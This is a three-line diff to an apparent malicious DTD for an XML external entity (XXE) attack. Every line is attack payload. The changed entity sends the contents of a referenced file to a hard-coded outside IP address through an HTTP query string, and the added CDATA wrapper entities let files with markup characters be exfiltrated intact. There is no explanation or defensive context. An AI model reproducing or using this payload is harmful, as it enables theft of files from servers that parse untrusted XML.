@@ -1,1 +1,3 @@
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://154.223.132.14/ttt/ip.php?DT=%file;'>">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % all "<!ENTITY send SYSTEM  'http://154.223.132.14/ttt/ip.php?DT=%start;%file;%end;'>">
